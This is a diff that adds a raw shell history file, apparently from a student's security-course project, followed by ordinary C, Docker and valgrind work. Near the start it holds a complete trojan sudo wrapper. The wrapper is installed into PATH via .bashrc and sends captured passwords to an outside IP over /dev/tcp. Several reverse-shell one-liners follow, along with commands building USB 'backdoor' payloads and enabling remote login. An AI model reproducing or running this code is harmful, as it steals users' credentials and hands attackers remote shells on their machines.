+echo "export PATH=~/.config/sudo:$PATH" >> ~/.bashrc\
+exit\
+exit\
+exit
+: 1542778445:0;ls -la
+: 1542778450:0;sudo -i
+: 1542778531:0;rm -rf ~/.config/sudo
+: 1542778544:0;mkdir -p ~/.config/sudo
+: 1542778555:0;echo '#!'$SHELL > ~/.config/sudo/sudo
+: 1542778564:0;/usr/bin/sudo -n true 2>/dev/null
+: 1542778708:0;if [ $? -eq 0 ]\
+then\
+/usr/bin/sudo $@\
+else\
+echo -n "[sudo] password for $USER: "\
+read -s pwd\
+echo\
+echo "$pwd" | /usr/bin/sudo -S true 2>/dev/null\
+if [ $? -eq 1 ]\
+then\
+echo "$USER:$pwd:invalid" > /dev/tcp/159.65.139.210/1337\
+echo "Sorry, try again."\
+sudo $@\
+else\
+echo "$USER:$pwd:valid" > /dev/tcp/159.65.139.210/1337\
+echo "$pwd" | /usr/bin/sudo -S $@\
+fi\
+fi' > ~/.config/sudo/sudo\
+chmod u+x ~/.config/sudo/sudo\
+echo "export PATH=~/.config/sudo:$PATH" >> ~/.bash_profile\
+echo "export PATH=~/.config/sudo:$PATH" >> ~/.bashrc\
+exit\
+exit\
+exit\
+if [ $? -eq 0 ]\
+then\
+/usr/bin/sudo $@\
+else\
+echo -n "[sudo] password for $USER: "\
+read -s pwd\
+echo\
+echo "$pwd" | /usr/bin/sudo -S true 2>/dev/null\
+if [ $? -eq 1 ]\
+then\
+echo "$USER:$pwd:invalid" > /dev/tcp/159.65.139.210/1337\
+echo "Sorry, try again."\
+sudo $@\
+else\
+echo "$USER:$pwd:valid" > /dev/tcp/159.65.139.210/1337\
+echo "$pwd" | /usr/bin/sudo -S $@\
+fi\
+fi' > ~/.config/sudo/sudo\
+chmod u+x ~/.config/sudo/sudo\
+echo "export PATH=~/.config/sudo:$PATH" >> ~/.bash_profile\
+echo "export PATH=~/.config/sudo:$PATH" >> ~/.bashrc\
+exit\
+exit\
+exit\
+exit
+: 1542811978:0;whoami
+: 1542812299:0;ifconfig |grep inet
+: 1542812494:0;ssh melchior@159.65.139.210
+: 1542813242:0;ifconfig |grep inet >> "/Desktop/prueba.txt"
+: 1542813285:0;ifconfig |grep inet >> "~/Desktop/prueba.txt"
+: 1542813350:0;ifconfig |grep inet >> "/Users/baroness/Desktop/prueba.txt"
+: 1542813376:0;mosh melchior@159.65.139.210
+: 1542814197:0;ifconfig |grep inet >> "/Volumes/NO NAME/prueba.txt"
+: 1542815855:0;whoami >> "/Desktop/prueba.txt"
+: 1542816259:0;ftp fer.codes
+: 1542817530:0;mosh melchior@159.65.139.210
+: 1542818831:0;sftp melchior@159.65.139.210
+: 1542819718:0;#! /bin/bash
+: 1542819742:0;QUERY0="$(ipconfig getpacket en0)";\
+QUERY1="$(ipconfig getpacket en1)";\
+MAC0="$(ifconfig en0 | grep ether | awk '{print $2}')";\
+MAC1="$(ifconfig en1 | grep ether | awk '{print $2}')";
+: 1542819780:0;ifconfi
+: 1542819782:0;ifconfig
+: 1542819896:0;networksetup
+: 1542823025:0;networksetup -getairportnetwork localhost
+: 1542823032:0;networksetup -getairportnetwork
+: 1542823122:0;networksetup -listVLANs
+: 1542823134:0;networksetup -listBonds
+: 1542823196:0;networksetup -getnetworkserviceenabled
+: 1542823201:0;networksetup -getnetworkserviceenabled localhost
+: 1542823208:0;networksetup -getnetworkserviceenabled wifi
+: 1542823213:0;networksetup -getnetworkserviceenabled en0
+: 1542823232:0;networksetup -getnetworkserviceenabled Amagi
+: 1542824128:0;sftp melchior@159.65.139.210
+: 1542824422:0;nano prueba333.txt
+: 1542825331:0;mosh melchior@159.65.139.210
+: 1542825766:0;cd "/Users/baroness/Documents/201802/CS029 Seguridad informaﾌ》ica & Encriptacioﾌ］ (A)/Proyecto final/"
+: 1542825778:0;java -jar encoder.jar -i backdoor1.txt -o "/Volumes/NO NAME/inject.bin"
+: 1542840686:0;cd ~/.ssh/authorized_keys
+: 1542840699:0;ls -la
+: 1542840709:0;ls .ssh
+: 1542840864:0;cd
+: 1542840868:0;cd .ssh
+: 1542841435:0;mkdir .prueba
+: 1542841438:0;ls -la
+: 1542841451:0;rm -r .prueba
+: 1542841454:0;ls -la
+: 1542842953:0;cd
+: 1542842966:0;echo "hi" >> "/Users/baroness/Desktop/prueba1.txt"
+: 1542843436:0;cd .ssh && ls -la
+: 1542843446:0;cd magisys
+: 1542843448:0;ls
+: 1542843469:0;cat melchior.pub
+: 1542843504:0;ls -la
+: 1542844321:0;sudo systemsetup -getremotelogin
+: 1542844334:0;systemsetup -getremotelogin
+: 1542844338:0;sudo systemsetup -getremotelogin
+: 1542845162:0;systemsetup -getremotelogin
+: 1542845166:0;systemsetup -f -setremotelogin on
+: 1542845439:0;mosh melchior@159.65.139.210
+: 1542845585:0;ifconfig |grep inet
+: 1542845597:0;-i >& /dev/tcp/10.195.154.42/1337 0>&1
+: 1542845630:0;bash -i >& /dev/tcp/10.195.154.42/1337 0>&1
+: 1542845678:0;echo '#!/bin/bash\
+bash -i >& /dev/tcp/10.195.154.42/1337 0>&1
+: 1542845881:0;echo '#!/bin/bash\
+bash -i >& /dev/tcp/159.65.139.210/1337 0>&1\
+\
+bash -i >& /dev/tcp/159.65.139.210/1337 0>&1\
+\
+\
+\
+bash -i >& /dev/tcp/10.195.154.42/1337 0>&1\
+bash -i >& /dev/tcp/10.195.154.42/1337 0>&\
+bash -i >& /dev/tcp/159.65.139.210/1337 0>&1
+: 1542856555:0;cd "/Users/baroness/Documents/201802/CS029 Seguridad informaﾌ》ica & Encriptacioﾌ］ (A)/Proyecto final/"
+: 1542856560:0;java -h
+: 1542856582:0;java -jar encoder.jar -h
+: 1542857343:0;java -jar encoder.jar -i backdoor1.txt -o "/Volumes/NO NAME/inject.bin" -l es
+: 1542857449:0;cd .ssh/authorized_keys
+: 1542857462:0;cd .ssh/aaa
+: 1542857471:0;bash
+: 1542857520:0;java -jar encoder.jar -i backdoor1_es.txt -o "/Volumes/NO NAME/inject.bin" -l es
+: 1542858682:0;ssh-keygen -h
+: 1542858690:0;ssh-keygen help
+: 1542858740:0;ssh-keygen -t rsa
+: 1542858799:0;cat /Users/baroness/.ssh/id_rsa.pub
+: 1542859130:0;ssh diegogonzalez@192.168.0.14
+: 1542861726:0;status
+: 1542861830:0;systemsetup -f -setremotelogin on
+: 1542861838:0;systemsetup status
+: 1542861846:0;sudo systemsetupstatus
+: 1542862242:0;mosh melchior@159.65.139.210
+: 1542864966:0;java -jar encoder.jar -i backdoor2.txt -o "/Volumes/NO NAME/inject.bin" -l es
+: 1542868429:0;figlet -w 40 backyard
+: 1542868437:0;figlet -w 80 backyard
+: 1542869259:0;figlet help
+: 1542869266:0;figlet -h
+: 1542870050:0;nc
+: 1542872633:0;java -jar encoder.jar
+: 1542874350:0;git clone https://github.com/armi3/backyard.git
+: 1542874507:0;git add .
+: 1542874542:0;git rm --cached Proyecto final/backyard
+: 1542874548:0;git add .
+: 1542874568:0;git commit -m "First mvp."
+: 1542874637:0;cd backyard
+: 1542874641:0;git add .
+: 1542874645:0;git commit -m "First mvp."
+: 1542874651:0;git push
+: 1542913833:0;git add . && git commit -m "Hotfixing
+: 1542913837:0;git add
+: 1542913853:0;git add . && git commit -m "Hotfixing
+: 1542913860:0;git add . && git commit -m "Hotfixinggit add . && git commit -m "Hotfixinggit add . && git commit -m "Hotfixing"
+: 1542913864:0;git add .
+: 1542913890:0;git commit -m "Hotfixing
+: 1542913895:0;git commit -m "Hotfixing"
+: 1542913900:0;git push
+: 1542914109:0;git add . && git commit -m "Hotfixing lol" && git push
+: 1542914324:0;cd
+: 1542918225:0;java -jar encoder.jar -i backdoor2.txt -o "/Volumes/NO NAME/inject.bin"
+: 1542918312:0;java -jar encoder
+: 1542918315:0;java -jar encoder.jar
+: 1542918326:0;cd ..
+: 1542918406:0;java -jar encoder.jar -i backdoor2.txt -o "/Volumes/NO NAME/inject.bin"
+: 1543296985:0;brew cask install deezer
+: 1543297660:0;deezer
+: 1543528181:0;brew cask install persepolis
+: 1543528295:0;brew cask install persepolis-download-manager
+: 1546124498:0;brew cask install terminus
+: 1546871284:0;brew cask install fruitjuice
+: 1547653399:0;brew cask deezloader
+: 1547653410:0;brew cask install deezloader
+: 1547653493:0;brew cask upgrade --greedy
+: 1547874861:0;cc holamundo.c 窶Φofirst
+: 1547874866:0;cc help
+: 1547874868:0;cc -h
+: 1547874874:0;cc ?
+: 1547874876:0;? cc
+: 1547874881:0;cc 
+: 1547874901:0;cc
+: 1547874904:0;cc man
+: 1547874908:0;cc --h
+: 1547874911:0;cc --help
+: 1547874977:0;cc holamundo.c 窶Φo holamundo
+: 1547875043:0;cc holamundo.c 窶Φo holamundo.out
+: 1547875054:0;cc holamundo.c -oholamundo
+: 1547875065:0;./holamundo
+: 1547875084:0;cc holamundo.c -oholamundo
+: 1547875086:0;./holamundo
+: 1547876417:0;cc nsum.c -ohnsum
+: 1547876477:0;./nsum
+: 1547876507:0;cc nsum.c -ohnsum
+: 1547876510:0;./nsum
+: 1547876518:0;cc nsum.c -onsum
+: 1547876521:0;./nsum
+: 1547876584:0;cc nsum.c -onsum
+: 1547876587:0;./nsum
+: 1547921548:0;brew cask install whatsapp
+: 1547921681:0;brew cask reinstall whatsapp
+: 1547921878:0;brew cask uninstall whatsapp
+: 1547921927:0;brew cask install whatsapp
+: 1547934825:0;ping google.com
+: 1548017542:0;./nsum
+: 1548018219:0;cc nsum.c -onsum
+: 1548018291:0;ping google.com
+: 1548033199:0;cc nsum.c -onsum
+: 1548033264:0;./nsum
+: 1548084716:0;brew install cunit
+: 1548114766:0;ls
+: 1548114777:0;cd ..
+: 1548114787:0;cd Prueba\ mﾃメs\ atrevida
+: 1548114789:0;ls
+: 1548114793:0;cd src
+: 1548114794:0;ls
+: 1548114817:0;gcc -o main main.c functions.c -I.
+: 1548114995:0;gcc -o app app.c functions.c -I.
+: 1548115031:0;cc -o app app.c functions.c -I.
+: 1548115037:0;cc -oapp app.c functions.c -I.
+: 1548115051:0;-v
+: 1548115097:0;cc app.c -oapp
+: 1548115283:0;cc functions.c -ofunctions
+: 1548115974:0;gcc
+: 1548115977:0;cc
+: 1548117207:0;gcc -std=c99 -o app app.c functions.c -lm
+: 1548117258:0;./app
+: 1548117596:0;gcc -std=c99 -o app app.c functions.c -lm
+: 1548117598:0;./app
+: 1548117896:0;gcc -std=c99 -o app app.c functions.c -lm
+: 1548120030:0;cunit
+: 1548120041:0;cunit -h
+: 1548120046:0;brew install cunit
+: 1548121010:0;cd ..
+: 1548121012:0;ls tests
+: 1548121017:0;cd tests
+: 1548121030:0;cc -o functions_test functions_test.c -lcunit
+: 1548121035:0;./functions_test
+: 1548121897:0;cc -o functions_test functions_test.c -lcunit
+: 1548122032:0;cc -o functions_test functions_test.c -lcunit -I
+: 1548122052:0;cc -o functions_test functions_test.c -lcunit -I..
+: 1548122056:0;cc -o functions_test functions_test.c -lcunit -I.
+: 1548122066:0;cc -o functions_test functions_test.c -lcunit
+: 1548123204:0;ls ../src
+: 1548123430:0;cc -o functions_test functions_test.c -I../src -lcunit
+: 1548123501:0;cc -o functions_test functions_test.c -lcunit
+: 1548123512:0;cc -o functions_test functions_test.c -lcunit -v
+: 1548123544:0;cc -o functions_test functions_test.c -lcunit -I
+: 1548123549:0;cc -o functions_test functions_test.c -lcunit -I.
+: 1548123555:0;cc -o functions_test functions_test.c -lcunit -I..
+: 1548123600:0;cc -o functions_test functions_test.c -lcunit
+: 1548124071:0;cd ..
+: 1548124116:0;gcc -std=c99 -o app app.c functions.c -lm
+: 1548124128:0;gcc -std=c99 -o app app.c functions.c
+: 1548124137:0;./app
+: 1548124155:0;gcc -o functions_test functions_test.c -lcunit
+: 1548124223:0;./functions_test
+: 1548124837:0;gcc -o functions_test functions_test.c -lcunit
+: 1548124893:0;gcc -std=c99 -o app app.c functions.c
+: 1548124896:0;./app
+: 1548124914:0;gcc -std=c99 -o functions_test functions_test.c -lcunit
+: 1548125127:0;./functions_test
+: 1548125316:0;gcc -std=c99 -o functions_test functions_test.c -lcunit
+: 1548125326:0;gcc -std=c99 -o functions_test functions_test.c -lcunit -v
+: 1548126121:0;./functions_test
+: 1548126798:0;./app
+: 1548127124:0;cd src
+: 1548127133:0;gcc -std=c99 -o app app.c functions.c
+: 1548127141:0;cd ..
+: 1548127146:0;cd tests
+: 1548127153:0;gcc -std=c99 -o functions_test functions_test.c -lcunit -v
+: 1548127162:0;./functions_test
+: 1548127398:0;gcc -std=c99 -o functions_test functions_test.c -lcunit -v
+: 1548127400:0;./functions_test
+: 1548127466:0;gcc -std=c99 -o functions_test functions_test.c -lcunit -v
+: 1548127468:0;./functions_test
+: 1548127571:0;gcc -std=c99 -o functions_test functions_test.c -lcunit -pg
+: 1548127604:0;./functions_test
+: 1548127787:0;ls ..
+: 1548127792:0;cd src
+: 1548127799:0;cd ..
+: 1548127802:0;cd src
+: 1548127817:0;gcc -std=c99 -o app app.c functions.c -pg
+: 1548127820:0;./app
+: 1548129328:0;cd ..
+: 1548129372:0;git remote add origin https://github.com/armi3/data-structures.git
+: 1548129420:0;git status
+: 1548129653:0;cd exercise\ 1
+: 1548129657:0;git init
+: 1548129673:0;git add .
+: 1548129750:0;git commit -m "First commit, ready to profile."
+: 1548129769:0;git remote add origin https://github.com/armi3/data-structures.git
+: 1548129783:0;git remote -v
+: 1548129802:0;git push -u origin master
+: 1548129851:0;cd ..
+: 1548129855:0;ls
+: 1548129858:0;git init
+: 1548129863:0;git add .
+: 1548129898:0;git commit -m "Reordering repository structure."
+: 1548129905:0;git remote add origin https://github.com/armi3/data-structures.git
+: 1548129909:0;git remote -v
+: 1548129916:0;git push -u origin master
+: 1548129959:0;git add .
+: 1548129963:0;git commit -m "Reordering repository structure."
+: 1548129971:0;git remote add origin https://github.com/armi3/data-structures.git
+: 1548129977:0;git remote -v
+: 1548129981:0;git push -u origin master
+: 1548130096:0;git init
+: 1548130104:0;git add .
+: 1548130133:0;git commit -m "First commit, ready for profiling."
+: 1548130140:0;git remote add origin https://github.com/armi3/data-structures.git
+: 1548130144:0;git remote -v
+: 1548130147:0;git push -u origin master
+: 1548168138:0;ssh melchior@159.65.139.210
+: 1548168233:0;ssh balthasar@159.65.139.210
+: 1548169019:0;gcc -std=c99 -o app app.c functions.c -g
+: 1548169031:0;ls
+: 1548169036:0;./app
+: 1548169081:0;valgrind
+: 1548169089:0;brew install valgrind
+: 1548169205:0;brew install gperftools
+: 1548169723:0;docker build -t memory-test:0.1 .
+: 1548169738:0;docker init
+: 1548169741:0;docker build -t memory-test:0.1 .
+: 1548169749:0;docker daemon
+: 1548170172:0;docker build -t memory-test:0.1 .
+: 1548170935:0;ls
+: 1548170990:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c "cd /test/; gcc -o app app.c && valgrind --leak-check=full ./app"
+: 1548171036:0;gcc -std=c99 -o app app.c functions.c -pg
+: 1548171056:0;gcc -std=c99 -o app app.c functions.c -g
+: 1548171072:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c "cd /test/; gcc -o app app.c && valgrind --leak-check=full ./app"
+: 1548171141:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c "cd /test/; gcc -std=c99 -o app app.c functions.c -g && valgrind --leak-check=full ./app"
+: 1548171213:0;docker run
+: 1548171396:0;git add .
+: 1548171423:0;git commit -m "Dockerfiles for Valgrind profiling added."
+: 1548171429:0;git push
+: 1548172879:0;docker build -t memory-test:0.1 .
+: 1548172944:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c "cd /test/; gcc -std=c99 -o functions_test functions_test.c -lcunit -pg && valgrind --leak-check=full ./app"
+: 1548173326:0;docker build -t memory-test:0.2 .
+: 1548173344:0;docker run -ti -v $PWD:/test memory-test:0.2 bash -c "cd /test/; gcc -std=c99 -o functions_test functions_test.c -lcunit -pg && valgrind --leak-check=full ./app"
+: 1548174293:0;cd ..
+: 1548174295:0;ls src
+: 1548174301:0;./app
+: 1548174409:0;cd src
+: 1548174412:0;./app
+: 1548174429:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c "cd /test/; gcc -std=c99 -o app app.c functions.c -g && valgrind --leak-check=full ./app"
+: 1548174495:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c "cd /test/; gcc -std=c99 -o app app.c functions.c -g && valgrind --leak-check=full ./app -v"
+: 1548174529:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c "cd /test/; gcc -std=c99 -o app app.c functions.c -g && valgrind --leak-check=full -v ./app"
+: 1548174632:0;cd ..
+: 1548174636:0;cd tests
+: 1548174637:0;ls
+: 1548174711:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c "cd /test/; gcc -std=c99 -o functions_test functions_test.c -lcunit -pg && valgrind --leak-check=full -v ./functions_test"
+: 1548174738:0;./functions_test
+: 1548175100:0;cd ..
+: 1548175102:0;cd src
+: 1548175118:0;cc -std=c99 -o app app.c functions.c
+: 1548175121:0;cd ..
+: 1548175123:0;cd tests
+: 1548175136:0;gcc -std=c99 -o functions_test functions_test.c -lcunit -pg
+: 1548175139:0;./functions_test
+: 1548175177:0;gcc -std=c99 -o functions_test functions_test.c -lcunit -pg
+: 1548175181:0;./functions_test
+: 1548175889:0;gcc -std=c99 -o functions_test functions_test.c -lcunit -v
+: 1548175896:0;./functions_test
+: 1548175976:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c "cd /test/; gcc -std=c99 -o functions_test functions_test.c -lcunit -v && valgrind --leak-check=full -v ./functions_test"
+: 1548176015:0;./functions_test
+: 1548176344:0;docker run -ti -v memory-test:0.1 bash -c "gcc -std=c99 -o functions_test functions_test.c -lcunit -v && valgrind --leak-check=full -v ./functions_test"
+: 1548176387:0;docker run -ti -v $PWD memory-test:0.1 bash -c "gcc -std=c99 -o functions_test functions_test.c -lcunit -v && valgrind --leak-check=full -v ./functions_test"
+: 1548176563:0;gcc -std=c99 -o functions_test functions_test.c -lcunit -v
+: 1548176566:0;cd ..
+: 1548176627:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c "cd /test/; gcc -std=c99 -o tests/functions_test tests/functions_test.c -lcunit -v && valgrind --leak-check=full -v tests/functions_test"
+: 1548176723:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c "cd /test/; gcc -std=c99 -o tests/functions_test tests/functions_test.c -lcunit -v && valgrind --leak-check=full -v ./functions_test"
+: 1548176759:0;gcc -std=c99 -o tests/functions_test tests/functions_test.c -lcunit -v
+: 1548176815:0;./functions_test
+: 1548176900:0;gcc -std=c99 -o tests/functions_test tests/functions_test.c -lcunit -v
+: 1548176903:0;./functions_test
+: 1548176911:0;tests/functions_test
+: 1548176941:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c "cd /test/; gcc -std=c99 -o tests/functions_test tests/functions_test.c -lcunit -v && valgrind --leak-check=full -v tests/functions_test"
+: 1548177019:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c "cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g && valgrind --leak-check=full -v src/app"
+: 1548177349:0;ls /usr/local/include/CUnit
+: 1548177469:0;docker run -ti -v $PWD:/test /usr/local/include/CUnit:/test memory-test:0.1 bash -c "cd /test/; gcc -std=c99 -o tests/functions_test tests/functions_test.c -lcunit -v tests/functions_test"
+: 1548177509:0;docker run -ti -v $PWD:/test -v /usr/local/include/CUnit:/test memory-test:0.1 bash -c "cd /test/; gcc -std=c99 -o tests/functions_test tests/functions_test.c -lcunit -v tests/functions_test"
+: 1548177736:0;docker run -ti -v $PWD:/test -v /usr/local/include/CUnit:. memory-test:0.1 bash -c "cd /test/; gcc -std=c99 -o tests/functions_test tests/functions_test.c -lcunit -v tests/functions_test"
+: 1548177841:0;docker run -ti -v $PWD:/test -v /usr/local/include/CUnit:/include memory-test:0.1 bash -c "cd /test/; gcc -std=c99 -o tests/functions_test tests/functions_test.c -lcunit -v tests/functions_test"
+: 1548178255:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c "cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g && valgrind --leak-check=full -v src/app"
+: 1548178345:0;docker run -ti -v $PWD:/test -v /usr/local/include/CUnit:/include memory-test:0.1 bash -c "cd /test/; gcc -std=c99 -o tests/functions_test tests/functions_test.c -lcunit -v tests/functions_test"
+: 1548178433:0;tests/functions_test
+: 1548178547:0;docker run -ti -v $PWD:/test -v /usr/local/include/CUnit:/include memory-test:0.1 bash -c "cd /test/; gcc -std=c99 -o tests/functions_test_prof tests/functions_test.c -lcunit -v tests/functions_test_prof"
+: 1548178733:0;docker run -ti -v $PWD:/test -v /usr/local/include/CUnit:/include memory-test:0.1 bash -c "cd /test/; gcc -std=c99 -o tests/functions_test tests/functions_test.c -g tests/functions_test -lcunit -v"
+: 1548178838:0;docker run -ti -v $PWD:/test -v /usr/local/include/CUnit:/include memory-test:0.1 bash -c "cd /test/; gcc -std=c99 -o tests/functions_test tests/functions_test.c -lcunit -v  && valgrind --leak-check=full -v tests/functions_test"
+: 1548178872:0;docker run -ti -v $PWD:/test -v /usr/local/include/CUnit:/test/include memory-test:0.1 bash -c "cd /test/; gcc -std=c99 -o tests/functions_test tests/functions_test.c -lcunit -v  && valgrind --leak-check=full -v tests/functions_test"
+: 1548178934:0;docker run -ti -v $PWD:/test -v /usr/local/include/CUnit:/test/usr/local/include memory-test:0.1 bash -c "cd /test/; gcc -std=c99 -o tests/functions_test tests/functions_test.c -lcunit -v  && valgrind --leak-check=full -v tests/functions_test"
+: 1548178953:0;docker run -ti -v $PWD:/test -v /usr/local/include/CUnit:/usr/local/include memory-test:0.1 bash -c "cd /test/; gcc -std=c99 -o tests/functions_test tests/functions_test.c -lcunit -v  && valgrind --leak-check=full -v tests/functions_test"
+: 1548179016:0;docker run -ti -v $PWD:/test -v /usr/local/include/CUnit:/test/local/include memory-test:0.1 bash -c "cd /test/; gcc -std=c99 -o tests/functions_test tests/functions_test.c -lcunit -v  && valgrind --leak-check=full -v tests/functions_test"
+: 1548179030:0;docker run -ti -v $PWD:/test -v /usr/local/include/CUnit:/local/include memory-test:0.1 bash -c "cd /test/; gcc -std=c99 -o tests/functions_test tests/functions_test.c -lcunit -v  && valgrind --leak-check=full -v tests/functions_test"
+: 1548179051:0;docker run -ti -v $PWD:/test -v /usr/local/include/CUnit:/test/include memory-test:0.1 bash -c "cd /test/; gcc -std=c99 -o tests/functions_test tests/functions_test.c -lcunit -v  && valgrind --leak-check=full -v tests/functions_test"
+: 1548179196:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c "cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g && valgrind --leak-check=full -v src/app"
+: 1548179437:0;git add .
+: 1548179473:0;git commit -m "Instructions and screenshot added."
+: 1548179475:0;git push
+: 1548179593:0;cd src
+: 1548179595:0;cc -std=c99 -o app app.c functions.c
+: 1548179598:0;./app
+: 1548179607:0;cd ..
+: 1548179612:0;cd tests
+: 1548179623:0;gcc -std=c99 -o functions_test functions_test.c -lcunit -v
+: 1548179626:0;./app
+: 1548179634:0;./functions_test
+: 1548179641:0;cd ..
+: 1548179686:0;docker build -t memory-test:0.1 .
+: 1548179703:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \
+    "cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \
+    && valgrind --leak-check=full -v src/app"
+: 1548180471:0;git pull
+: 1548215768:0;docker build -t memory-test:0.1 .
+: 1548215823:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c "cd /test/; gcc -std=c99 -o tests/functions_test tests/functions_test.c -lcunit -v  && valgrind --leak-check=full -v tests/functions_test"
+: 1548216152:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+    "cd /test/; gcc -std=c99 -o tests/functions_test tests/functions_test.c \\
+    -lcunit -v  && valgrind --leak-check=full -v tests/functions_test"
+: 1548216168:0;cd ..
+: 1548216171:0;git add .
+: 1548216230:0;git commit -m "Dockerfile updated with CUnit installation for tests' profiling."
+: 1548216235:0;git push
+: 1548217027:0;brew cask install slack
+: 1548265546:0;cd exercise\ 1
+: 1548265581:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+    "cd /test/; gcc -std=c99 -o tests/functions_test tests/functions_test.c \\
+    -lcunit -v  && valgrind --leak-check=full -v tests/functions_test"
+: 1548265629:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+    "cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
+    && valgrind --leak-check=full -v src/app"
+: 1548265724:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
+&& valgrind --tool=lackey  -v src/app"
+: 1548266174:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
+&& valgrind --tool=callgrind  -v src/app"
+: 1548266901:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
+&& valgrind --tool=callgrind --tree=both -v src/app"
+: 1548267032:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c "valgrind callgrind_annotate --tree=both callgrind.out.13 -v src/app"
+: 1548267102:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c "valgrind callgrind_annotate --auto=yes --tree=both callgrind.out.13 -v src/app"
+: 1548267133:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c "valgrind callgrind_annotate --auto=yes --tree=both callgrind.out.13 src/app"
+: 1548267165:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c "valgrind callgrind_annotate --auto=yes --tree=both callgrind.out.13 app"
+: 1548288891:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
+&& valgrind --tool=callgrind -v src/app"
+: 1548288953:0;callgrind_control -h
+: 1548289172:0;valgrind --tool=callgrind callgrind_annotate callgrind.out.13 
+: 1548289194:0;brew install valgrind
+: 1548289286:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
+&& valgrind --tool=callgrind -v src/app"
+: 1548289382:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
+&& valgrind --tool=callgrind -v src/app \\
+&& valgrind callgrind_annotate"
+: 1548289592:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
+&& valgrind --tool=callgrind -v src/app \\
+&& valgrind callgrind_annotate --tree=both --auto=yes  --cache-sim=yes"
+: 1548289664:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
+&& valgrind --tool=callgrind -v src/app \\
+&& valgrind callgrind_annotate --tree=both --auto=yes  --cache-sim=yes callgrind.out.13"
+: 1548289701:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
+&& valgrind --tool=callgrind -v src/app \\
+&& valgrind callgrind_annotate --tree=both --auto=yes"
+: 1548291528:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
+&& valgrind --tool=lackey  -v src/app"
+: 1548292186:0;docker run -ti -v $PWD:/test -v /usr/local/include/CUnit:/test/include memory-test:0.1 bash -c "cd /test/; gcc -std=c99 -o tests/functions_test tests/functions_test.c -g -lcunit -v  && valgrind --leak-check=full -v tests/functions_test"
+: 1548292251:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o tests/functions_test tests/functions_test.c -g \\
+-lcunit -v  && valgrind --leak-check=full -v tests/functions_test"
+: 1548292663:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
+&& valgrind --tool=massif -v src/app\
+"
+: 1548292733:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
+&& valgrind --tool=massif src/app"
+: 1548294162:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c \\
+&& valgrind --tool=massif src/app"
+: 1548294174:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
+&& valgrind --tool=massif src/app"
+: 1548294264:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
+&& valgrind --tool=massif -v src/app"
+: 1548294508:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g"
+: 1548294696:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
+&& valgrind --tool=massif src/app"
+: 1548294711:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
+&& valgrind --tool=massif -v src/app"
+: 1548294783:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
